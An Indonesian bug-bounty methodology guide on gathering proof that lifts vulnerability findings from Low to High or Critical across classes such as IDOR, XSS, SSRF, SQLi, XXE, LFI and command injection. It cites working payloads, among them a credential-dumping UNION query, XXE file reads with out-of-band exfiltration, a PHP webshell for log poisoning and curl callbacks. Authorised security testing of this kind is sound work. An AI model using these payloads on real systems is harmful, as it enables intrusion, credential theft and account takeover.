# Severity Climb Plays — teknik untuk MENDAPATKAN artefak pemutus

Baca hanya kelas yang sedang kamu garap. Format tiap kelas:

```
CEILING SEKARANG   apa yang membuatnya Low
ARTEFAK -> HIGH    bukti yang harus kau pegang
CARA               langkah konkret untuk mendapatkannya
ARTEFAK -> CRITICAL bukti yang mengangkat ke Critical
BATAS              kapan lead ini harus DIDROP (jangan bakar jam)
```

---

## IDOR / BOLA

**CEILING SEKARANG** — membaca objek; sering objek sendiri, atau objek publik.

**ARTEFAK → HIGH** — objek milik **akun kedua yang kau buat sendiri**, bukan orang lain,
dibaca dari sesi bersih, dan isinya nyata (email/amount/nomor). Minimum 10 record agar
terbaca "mass", bukan "satu kebetulan".

**CARA**
1. Buat 2 akun (A, B). Di B buat record yang diberi penanda unik (`TENANTB-MARKER-7731`).
2. Dari token A, panggil objek B: `GET /api/invoices/{B_id}`.
3. Bandingkan dengan baseline: `GET /api/invoices/{A_id}` → punya A harus 200,
   punya B harus 403/404. **Kalau keduanya 200 dengan isi berbeda → BOLA terbukti.**
4. Enumerasi: `for i in range(1,60)` — hitung berapa record asing terbaca. Angka itu
   masuk laporan.
5. Ulangi pada **semua** endpoint ber-id di app yang sama (aturan adjacent-gate). Satu
   pola di 8 endpoint = "klasifikasi masalah", severity naik.

**ARTEFAK → CRITICAL**
- `PUT/PATCH/DELETE` pada objek B → 200, lalu **re-read** dan state benar-benar berubah.
- Objek asing mengandung `token` / `session` / `reset_link` / `api_key` → langsung ATO.
- Lintas-tenant pada SaaS multi-tenant (bukan cuma lintas-user) → naik satu tingkat lagi.

**BATAS** — kalau ID tidak bisa dienumerasi (UUIDv4 acak yang kau dapat dari tempat lain),
nyatakan `AC:H` dan jangan klaim mass exploitation. Kalau objeknya memang publik
by design (share link tanpa auth), itu bukan IDOR.

---

## XSS

**CEILING SEKARANG** — reflected, butuh korban klik, atau self-only.

**ARTEFAK → HIGH** — **STORED** dan terpicu untuk **akun kedua** (B membuka halaman, XSS
A jalan). Reflected → High hanya kalau ada jalur tanpa interaksi (mis. terpicu di halaman
admin yang memproses URL itu otomatis).

**CARA**
1. Cari sink penyimpanan: komentar, bio, nama file, judul tiket, nama workspace.
2. Simpan payload dengan marker unik: `<img src=x onerror="window.__X='MARKER7731'">`.
3. Login sebagai **B**, buka halaman yang merender data A. Cek
   `window.__X === 'MARKER7731'` — bukan cuma "payload ada di HTML".
4. Cek juga konteks atribut: encoder `text().html()` aman di text-node, **tidak** aman
   di dalam `value="..."` (kutip tidak di-escape).

**ARTEFAK → CRITICAL**
- Cookie sesi **non-HttpOnly** terbaca → pakai cookie itu untuk request sebagai korban,
  tunjukkan respons `/me` mengembalikan identitas korban.
- Atau XSS memicu aksi privileged: ganti email korban → reset password → ATO penuh.
- Stored XSS di panel admin yang dilihat staf → rantai ke aksi admin.

**BATAS** — `alert(1)` bukan bukti. Self-XSS tanpa CSRF adalah CAPPED. XSS di halaman
tanpa sesi dan tanpa aksi sensitif = Low.

---

## SSRF

**CEILING SEKARANG** — DNS callback saja, atau error yang terlihat seperti filter.

**ARTEFAK → HIGH** — **body dari host internal dikembalikan**. Bukan DNS ping.

**CARA**
1. Bangun target internal yang **tidak bisa kau jangkau dari luar** (container tanpa port
   publik, atau `127.0.0.1:<port admin>`). Ini yang membuat bukti tak terbantahkan.
2. `POST /fetch {"url":"http://<internal>/secret"}` → respons memuat isi internal.
3. **Kontrol wajib:** URL eksternal biasa harus juga berhasil. Kalau URL benign ikut
   diblok dengan pesan identik, itu filter/NAT, **bukan** SSRF — tarik klaimnya.
4. Uji varian: `127.1`, `2130706433`, `[::1]`, `0`, `127.0.0.1.nip.io`, `user@host`
   (userinfo bypass pada allowlist `startswith`).

**ARTEFAK → CRITICAL**
- `169.254.169.254` metadata → kredensial cloud → **pakai** kredensial itu ke API provider
  (read-only call yang berhasil). Kredensial yang tidak bisa dipakai = High, bukan Critical.
- Internal admin console yang bisa dioperasikan.
- `gopher://` / `dict://` → Redis/memcached → tulis cron/SSH key → RCE.

**BATAS** — "DNS callback only" ada di NEVER SUBMIT list. Blind SSRF butuh OOB
(interactsh) untuk dibuktikan; content matcher yang diam di blind sink adalah
**perilaku benar**, bukan meleset.

---

## SQLi

**CEILING SEKARANG** — error SQL, atau UNION yang mengembalikan kolom kosong.

**ARTEFAK → HIGH** — data dari **tabel nyata**, ≥10 baris, dengan isi yang bisa dibaca.

**CARA**
1. Kalibrasi jumlah kolom: `UNION SELECT 1,2,...,n` sampai tidak error (n=10 di Juice Shop,
   bukan 9). Catat n — itu bukti kerja, bukan tebakan.
2. Dump kolom yang berguna: `UNION SELECT id,email,password,4..n FROM Users--`.
3. Hitung baris dan tunjukkan sampel nyata (email + hash).
4. Blind: `SLEEP(3)` **dengan kontrol** — 3.03s vs 0.01s adalah bukti; 3.03s tanpa kontrol
   bukan bukti (cold start bisa 1s).

**ARTEFAK → CRITICAL**
- Hash/kredensial yang **berhasil dipakai login** (crack → login 200 → sesi admin).
  Ini yang mengubah "hash bocor" jadi "ATO".
- `INTO OUTFILE` → webshell → `uid=`.
- `LOAD_FILE` membaca `/etc/passwd` atau private key.

**BATAS** — dump massal di luar kebutuhan bukti melanggar aturan program. Ambil sampel
yang membuktikan akses, lalu berhenti. Error SQL tanpa data = Info.

---

## Race Condition

**CEILING SEKARANG** — "kelihatan bisa double", timing saja.

**ARTEFAK → HIGH** — **delta terukur**: 2+ efek dari 1 hak, dengan angka.

**CARA**
1. Siapkan state bersih (1 keranjang isi 1 item, saldo 0, kuota tersisa 1).
2. Catat **before**: jumlah order, saldo, kuota.
3. Kirim N request paralel (threading, bukan loop) pada aksi sekali-pakai.
4. Catat **after** dan hitung delta. `12 checkout paralel → 12 order` adalah bukti;
   `{200:12}` saja bukan (bisa jadi idempoten).
5. Kontrol: jalankan berurutan (serial) → harus 1 efek. Kalau serial juga 12, itu bukan race.

**ARTEFAK → CRITICAL**
- Uang/kredit benar-benar bertambah dan **bisa dipakai** (bukan hanya tercatat).
- Double-spend bernilai nyata, atau kuota plan terlampaui permanen.
- Race pada reset-token → 2 token valid → ambil alih akun.

**BATAS** — race pada aksi yang tidak mengubah nilai = Low. Jangan klaim "financial
impact" tanpa angka saldo/order.

---

## Info Disclosure

**CEILING SEKARANG** — file/versi/hostname bocor tanpa konsumen.

**ARTEFAK → HIGH** — kredensial dari kebocoran **berhasil dipakai** (login sukses atau
API call berhasil).

**CARA**
1. `.env` / `config.json` / `.git/config` → kumpulkan kredensial.
2. Uji **read-only** ke vendor yang sesuai: DB login, API key ke endpoint-nya, JWT secret
   → forge token → akses endpoint terautentikasi.
3. Kalau kredensial sudah mati (API pindah, key revoked) → **tidak bisa dibuktikan** →
   drop, jangan staged.

**ARTEFAK → CRITICAL**
- Kredensial privileged: admin panel login, DB user dengan write, cloud IAM key yang
  benar-benar bisa dipanggil.
- `machineKey` / signing key → forge auth token → RCE/ATO.

**BATAS** — versi/banner tanpa CVE yang dieksekusi = Info. Bocoran yang mengarah ke
**daftar service** (URL panel admin, hostname DB) nilainya adalah target list yang
diberikannya — fingerprint service itu, jangan laporkan bocorannya sendirian.

---

## Auth Bypass

**CEILING SEKARANG** — 200 di halaman login, atau error validasi.

**ARTEFAK → HIGH** — fungsi privileged **benar-benar berjalan** (bukan cuma halaman render).

**CARA**
1. **Layer-ordering test dulu** (jebakan paling mahal): kirim body **well-formed minimal**
   `{}`, bukan body rusak `{`. Sanitizer berjalan sebelum auth; body rusak → 400 yang
   terlihat seperti bypass padahal bukan.
2. Method tampering: `GET→POST→PUT→DELETE→PATCH→HEAD→OPTIONS`.
3. Path canonicalization: `/admin/.`, `//admin`, `/admin%20`, `/Admin`, `/admin?`, `/admin#`.
4. Header: `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For: 127.0.0.1`,
   `X-Custom-IP-Authorization`.
5. Verifikasi bahwa fungsi **melakukan sesuatu**: baca state setelahnya.

**ARTEFAK → CRITICAL**
- Sesi admin penuh + aksi **tulis** (bukan read-only).
- Bypass ke akun user lain → ATO.
- Admin panel → upload → webshell → RCE.

**BATAS** — 403 yang berubah jadi 200 tapi body byte-identik dengan baseline = bukan
bypass. Bandingkan **body**, bukan status.

---

## Business Logic

**CEILING SEKARANG** — "kelihatan bisa", tanpa angka.

**ARTEFAK → HIGH** — kerugian **terukur**: harga/saldo/kuota benar-benar berubah.

**CARA**
1. Tulis invarian yang seharusnya dijaga (`total = Σ harga × qty`, `saldo ≥ 0`,
   `kuota ≤ plan`).
2. Coba langgar satu per satu: qty negatif, harga 0, kupon bertumpuk, refund 2x,
   currency rounding, proration, trial berulang.
3. **Re-read state** setelah setiap upaya — 200 bukan bukti, state berubah itu bukti.
4. Tunjukkan angka: `total = -199.00`, `saldo 0 → 240000`, `kuota 5 → 12`.

**ARTEFAK → CRITICAL**
- Uang benar-benar berpindah dan bisa ditarik/dipakai.
- Entitlement plan termahal didapat gratis dan berfungsi.
- Privesc via field `role`/`is_admin`/`verified` yang bisa di-set.

**BATAS** — field yang **tidak divalidasi sama sekali** seringkali *input alokasi*
by design, bukan kontrol keamanan yang jebol. Kalau server tidak pernah *mencoba*
menegakkan batas, itu by-design. Yang valid: server mencoba menegakkan lalu gagal.

---

## ATO

**CEILING SEKARANG** — reset berhasil tapi belum login; atau enumerasi email.

**ARTEFAK → HIGH** — **login sebagai korban berhasil** dan token diterbitkan.

**CARA**
1. Pecah rantai jadi hop dan buktikan tiap hop: enumerasi → oracle pertanyaan keamanan →
   token reset → submit → **login**.
2. Untuk reset via security question: pertanyaannya sering terdisclosing lewat
   `/security-question?email=` (itu enumerasi, bukan ATO). Jawabannya harus didapat
   (OSINT pada akun uji sendiri, atau oracle).
3. Buktikan dengan `/me` atau endpoint identitas yang mengembalikan **email korban**.

**ARTEFAK → CRITICAL**
- Korban adalah **admin/privileged**.
- Tanpa interaksi korban sama sekali.
- Sesi lama tetap hidup setelah korban ganti password (remediation bypass).

**BATAS** — reset 200 tanpa login = Medium. Enumerasi email sendirian = sering
out-of-scope; jangan laporkan sebagai ATO.

---

## Open Redirect / GraphQL introspection (kelas tanpa High mandiri)

**CEILING** — keduanya **tidak punya** jalur High sendiri. Jangan pernah dilaporkan
sendirian.

**Open redirect → Critical** hanya lewat: `redirect_uri` OAuth menerima domain attacker
→ authorization code curian → tukar jadi token → ATO. Atau reset-password link
mengarahkan token ke domain attacker.

**GraphQL introspection → High** hanya lewat: field-level authz bypass pada `node(id:)`
atau mutasi yang mengembalikan data user lain; alias batching untuk melewati rate limit
lalu brute-force OTP.

**CARA** — cari **consumer**-nya dulu. Tanpa consumer, verdict = `NEED-CHAIN`, dan
kalau consumer tidak ada di scope → **DROP**, jangan staged.

---

## Aturan lintas-kelas yang mengangkat semua kelas

1. **Dua akun sendiri** adalah instrumen severity termurah. Hampir semua lonjakan
   Low→High melewati batas akun. Buat akun sejak awal engagement, bukan saat butuh.
2. **Re-read setelah write.** `200 OK` bukan perubahan state. Selalu baca ulang.
3. **Angka, bukan kata sifat.** "Banyak data" = Info. "14 invoice lintas-akun" = High.
4. **Kontrol negatif wajib.** Setiap klaim butuh pembanding yang seharusnya GAGAL.
   Tanpa kontrol, filter/NAT/WAF akan menyamar sebagai temuan.
5. **Adjacent-gate.** Satu temuan = uji semua titik sejenis, lalu laporkan sebagai pola.
6. **Konsumen sebelum klaim.** Token/key/URL yang bisa dibuat tapi tidak ada yang
   menerima = `UNPROVEN`, bukan temuan dan bukan verified negative.
7. **HTTP 200 bisa berarti 401.** Di API yang membungkus semua respons dalam envelope
   (`{"status":"error","data":{"code":401,...}}`), status code HTTP **selalu 200**.
   Membaca status saja akan menyimpulkan "no auth gate" pada endpoint yang justru
   terlindungi — dan itu overclaim Critical. **Baca body, bukan status.**
   Terukur di Titan (2026-10): `POST /register` → HTTP 200 + `code:401 Unauthorized`.
8. **Validation-before-auth bukan bypass.** `400 "Invalid message"` pada endpoint tulis
   berarti parser jalan sebelum auth — bukan bukti auth hilang. Uji dengan body
   well-formed; kalau tetap minta signature/token, gate-nya ada.
9. **Baca payload builder dari bundle, jangan tebak.** Endpoint tulis sering tidak
   muncul di wordlist. Grep bundle untuk `post("`/`put("` → Titan menyembunyikan
   `modifystake` dan `settos` di balik nama fungsi minified (`J4`, `u4`).
10. **WEB3: data yang derivable dari chain publik bukan confidentiality.** Terukur di
    Flux/Titan (2026-10-27): unauthenticated IDOR membocorkan `payment_address`,
    `collateral`, `paid`, `tx` — dinilai **High** oleh saya, **Low** oleh vendor, dengan
    alasan *"payout bookkeeping largely visible on-chain anyway"*. Mereka benar:
    address + collateral + tx memang ada di ledger publik. **Turunkan satu tingkat**
    bila klaim confidentiality hanya menyangkut data on-chain. Yang **tetap** High/Critical
    hanya rahasia off-chain: email, KYC/nama asli, kredensial, token sesi, relasi
    identitas (ZelID↔email), atau dampak **integritas/availability** (dana berpindah).
    Engine sekarang punya guard `onchain_only()` untuk ini — jangan dimatikan.

11. **Kredensial "bocor" vs kredensial "dipakai sebagai alat".** `"GET invoice with
    user A token returned a foreign invoice"` = token **milik peneliti**, itu alat, bukan
    kebocoran → High (bukan Critical). Yang menaikkan ke Critical adalah konstruksi
    eksposur eksplisit: *"response **contains** the victim's session token"* /
    *"api_key **exposed** in the record"*. Buktikan pemakaiannya (replay → login sebagai
    korban) sebelum klaim Critical.

---

# Kelas pembawa Critical/High lainnya

## Mass Assignment / Privilege Escalation

**ARTEFAK → HIGH** — field privileged yang kau set **benar-benar berlaku** saat dibaca
ulang dari endpoint lain (`/me`, export, admin list).

**CARA**
1. Ambil body request normal (register / update profile), tambahkan field:
   `role`, `is_admin`, `isAdmin`, `admin`, `verified`, `email_verified`, `plan`,
   `tier`, `credit`, `balance`, `permissions[]`, `org_id`.
2. Kirim, lalu **baca ulang dari sumber lain**. `PUT` mengembalikan echo ≠ tersimpan.
3. Uji juga nested: `{"user":{"role":"admin"}}`, `{"roles":["admin"]}`,
   `{"permissions":{"*":true}}`.
4. Cek field yang sama pada endpoint **create** vs **update** (sering satu lupa).

**ARTEFAK → CRITICAL** — role admin benar-benar memberi fungsi admin (bukan label):
bisa baca user lain / ubah konfigurasi / akses panel.

**BATAS** — field yang di-echo tapi tidak berpengaruh = bukan temuan. Field kosong yang
diterima tanpa error juga bukan bukti; buktinya adalah **nilai privileged tersimpan**.

---

## File Upload → RCE

**ARTEFAK → HIGH** — file yang di-upload **dapat diakses** di URL yang bisa ditebak, dan
tipe berbahaya diterima (bukan hanya gambar valid).

**CARA**
1. Tentukan di mana file disajikan (`/uploads/`, CDN, signed URL). Tanpa URL akses,
   upload tidak bernilai.
2. Bypass filter berlapis: ekstensi ganda `x.php.jpg`, null byte `x.php%00.jpg`,
   case `.PhP`, `.phtml/.phar/.php5`, content-type spoof, magic-bytes + polyglot
   (`GIF89a<?php ...`), `.htaccess` untuk mengaktifkan eksekusi.
3. Buktikan eksekusi: `GET /uploads/x.php?c=id` → `uid=`.
4. SVG/HTML → stored XSS (rantai ke sesi admin).

**ARTEFAK → CRITICAL** — eksekusi perintah (`uid=`), atau overwrite file yang dieksekusi
(cron, `.htaccess`, template), atau path traversal saat menyimpan
(`filename=../../var/www/html/x.php`).

**BATAS** — upload yang hanya menerima gambar valid dan menyajikan dari domain tanpa
eksekusi = bukan RCE. Jangan klaim RCE dari "file diterima".

---

## Deserialization

**ARTEFAK → HIGH** — objek ter-deserialize terbukti (bukan error parse), terlihat dari
perilaku yang berubah / callback OOB.

**CARA**
1. Temukan sink: cookie sesi, hidden field, header (`X-Api-*`), import file, message queue.
2. Fingerprint format: Java (`rO0AB`, `AC ED`), PHP (`O:8:"stdClass"`), Python pickle
   (`\x80\x04`), .NET (`AAEAAAD/////`), YAML (`!!python/object`).
3. Java: ysoserial gadget sesuai library di classpath. PHP: phpggc. Python: `__reduce__`.
4. Buktikan dengan callback OOB (DNS/HTTP) sebelum mencoba eksekusi.

**ARTEFAK → CRITICAL** — eksekusi perintah (`uid=`), atau file write, atau SSRF ke
metadata cloud.

**BATAS** — deserialization yang hanya memicu error = Info. Butuh gadget yang benar-benar
ada di classpath; kalau tidak ada, itu tidak bisa dieksploitasi.

---

## SSTI

**ARTEFAK → HIGH** — evaluasi ekspresi terbukti: `{{7*7}}` → `49`, `${7*7}` → `49`,
`#{7*7}` → `49`. Lalu baca konfigurasi/env.

**CARA**
1. Fingerprint engine dengan polyglot: `${{<%[%'"}}%\`.
2. Konfirmasi aritmetika, lalu naik: `{{config}}`, `{{self.__class__}}`,
   `${T(java.lang.Runtime)}`, `{{''.__class__.__mro__}}`.
3. Baca file/env → kredensial.

**ARTEFAK → CRITICAL** — eksekusi perintah (`uid=`), sandbox escape, atau tulis file.

**BATAS** — refleksi `{{7*7}}` sebagai teks = bukan SSTI. Harus **49**.

---

## XXE

**ARTEFAK → HIGH** — isi file lokal muncul di respons (`/etc/passwd`).

**CARA**
1. Cari parser XML: SOAP, SAML, DOCX/XLSX/SVG import, RSS, `Content-Type: application/xml`.
2. `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>` → `&e;`.
3. Kalau respons tidak menampilkan, pakai OOB: `SYSTEM "http://<interactsh>/"` +
   parameter entity untuk exfil isi file.
4. Coba juga `php://filter`, `expect://`, dan SSRF via `SYSTEM "http://169.254.169.254/"`.

**ARTEFAK → CRITICAL** — baca private key/kredensial, SSRF ke metadata cloud, atau
`expect://` → RCE.

**BATAS** — parser yang menolak DOCTYPE = aman. Jangan klaim XXE dari error parse.

---

## LFI / Path Traversal

**ARTEFAK → HIGH** — file sensitif terbaca: `/etc/passwd`, `.env`, private key, config DB.

**CARA**
1. Kalibrasi kedalaman: `../` × 2..8 → `/etc/passwd`. Catat depth yang berhasil.
2. Bypass filter: `....//`, `%2e%2e%2f`, double-encode, null byte, absolute path,
   `php://filter/convert.base64-encode/resource=index`.
3. Baca `/proc/self/environ`, `/proc/self/cmdline` untuk env & command line.

**ARTEFAK → CRITICAL** — log poisoning (User-Agent → `<?php system($_GET[c]); ?>` lalu
include access.log) → RCE; `/proc/self/environ` berisi secret yang bisa dipakai;
`php://input` / `data://` → RCE.

**BATAS** — traversal yang hanya mengembalikan halaman error = bukan LFI.

---

## OAuth / JWT / SAML (auth core)

**ARTEFAK → HIGH** — token/assertion yang bisa dipalsukan **diterima** oleh resource server.

**CARA JWT**
1. `alg:none` (semua kapitalisasi), `HS256` dengan public key sebagai secret,
   `kid` injection (path traversal / SQLi), `jku`/`x5u` ke URL milikmu.
2. **Cek gate lanjutan**: audience, issuer, `nbf`, key-id binding. JWT `alg:none` yang
   ditolak karena issuer check = **bukan temuan** (retraksi yang benar).

**CARA OAuth**
1. `redirect_uri` menerima domain attacker (path/port/subdomain trick, `@`, `%2f`).
2. `state` tidak ada / tidak divalidasi → CSRF ke callback → akun korban tertaut ke attacker.
3. `code` reusable, atau `code` untuk client lain diterima.

**CARA SAML** — XML Signature Wrapping (pindahkan signed assertion, sisipkan yang palsu).

**ARTEFAK → CRITICAL** — login sebagai korban/admin berhasil (token diterbitkan untuk
identitas yang bukan milikmu).

**BATAS** — signature bypass yang masih tertahan audience/issuer check = High paling
banyak, sering Medium. Selalu uji klaim ke endpoint yang benar-benar memakai token.

---

## Command Injection

**ARTEFAK → HIGH** — output perintah muncul (`uid=33(www-data)`).

**CARA**
1. Metakarakter: `;`, `|`, `||`, `&&`, `$()`, backtick, newline `%0a`.
2. Blind: timing (`;sleep 5`), OOB (`;curl http://<interactsh>/`), file write.
3. Filter bypass: `${IFS}`, `$@`, `%0a`, encoding, wildcard `/???/??/??`.

**ARTEFAK → CRITICAL** — eksekusi sebagai privileged (`uid=0`), atau akses env berisi
kredensial cloud/DB, atau pivot internal.

**BATAS** — `sleep` yang tidak konsisten dengan kontrol = jitter, bukan injeksi.

---

## Web Cache Poisoning / Deception

**ARTEFAK → HIGH** — payload dari header/parameter unkeyed benar-benar tersaji ke
**pengguna lain** (verifikasi dengan sesi berbeda / cache HIT).

**CARA**
1. Cari header unkeyed yang direfleksikan: `X-Forwarded-Host`, `X-Forwarded-Scheme`,
   `X-Original-URL`, `X-Host`.
2. Poison halaman yang di-cache, lalu minta dengan sesi korban: apakah payload tersaji?
3. Cache deception: `/account/profile.css` → cache menyimpan halaman terautentikasi.

**ARTEFAK → CRITICAL** — XSS tersimpan di cache untuk semua pengguna, atau data
terautentikasi korban tersimpan di cache publik.

**BATAS** — refleksi tanpa cache HIT = bukan cache poisoning (itu XSS biasa).

---

## CORS

**ARTEFAK → HIGH** — origin attacker **dengan credentials** benar-benar membaca data
sensibilitas di browser (PoC JS + respons nyata).

**CARA**
1. `Origin: https://evil.com` → cek `Access-Control-Allow-Origin` + `Allow-Credentials`.
2. `null` origin (sandbox iframe), subdomain trick (`evil.target.com`),
   prefix/suffix match (`target.com.evil.com`).
3. Tulis PoC HTML yang benar-benar `fetch()` dan tampilkan datanya.

**ARTEFAK → CRITICAL** — data itu berisi token/session/API key, atau endpoint-nya
memungkinkan aksi tulis (bukan cuma baca).

**BATAS** — `ACAO: *` tanpa credentials = tidak bisa baca data authed (browser memblokir).
Tanpa PoC browser yang berhasil = Info.

---

## CSRF

**ARTEFAK → HIGH** — aksi **sensitif** berhasil lintas-situs tanpa interaksi:
ganti email, ganti password, tambah admin, transfer.

**CARA**
1. Cek token: ada? divalidasi? terikat sesi? bisa dipakai ulang?
2. Cek `SameSite` cookie: `None` tanpa `Secure`, atau `Lax` pada POST.
3. Uji dari origin berbeda dengan form auto-submit; verifikasi **state berubah**.

**ARTEFAK → CRITICAL** — aksi itu = ambil alih akun penuh (email+password diubah tanpa
konfirmasi) atau pemindahan dana.

**BATAS** — logout CSRF = bukan temuan. CSRF pada aksi yang butuh password saat ini
(step-up) = tidak bisa dieksploitasi.

---

## Subdomain Takeover

**ARTEFAK → HIGH** — konten attacker tersaji di subdomain target (CNAME menggantung ke
layanan yang bisa diklaim).

**CARA**
1. Enumerasi CNAME → deteksi fingerprint layanan yang belum diklaim
   (S3 "NoSuchBucket", Heroku "No such app", GitHub Pages 404, Azure, Fastly).
2. Klaim (bucket/repo/app) → sajikan file penanda → verifikasi via HTTP.

**ARTEFAK → CRITICAL** — subdomain itu terdaftar sebagai `redirect_uri` OAuth, atau
cookie sesi ter-scope ke parent domain sehingga bisa diset dari subdomain itu.

**BATAS** — subdomain tanpa dampak (tidak dipakai auth/cookie/OAuth) = Low. Jangan
klaim takeover tanpa benar-benar menyajikan konten.

---

## Web3 — hanya economic exploit yang dibayar

**CEILING** — protokol DeFi matang memberi N/A ke semua yang tidak memindahkan/mengunci
dana. Bug API/authz di backend DeFi biasanya **tidak dibayar** walau scope-nya bilang
"internal API".

**ARTEFAK → HIGH/CRITICAL** — kerugian dana yang bisa dihitung:
oracle manipulation, liquidation gaming, flash-loan, collateral pricing bypass,
weight-matrix corruption, NAV staleness, share inflation, signature replay.

**CARA (Foundry on fork, wajib)**
```
forge test --fork-url <RPC> --match-test test_exploit -vvvv
```
Laporkan **P&L attacker setelah gas** dan **biaya manipulasi vs nilai yang bisa diambil**.
Kalau biaya > hasil, itu bukan temuan.

**BATAS** — bug yang butuh private key admin, atau "centralization observation"
(single-key upgrade vs dokumentasi multisig), rutin di-N/A. Sebelum investasi di target
DeFi, cek apakah finding kelas itu pernah dibayar.
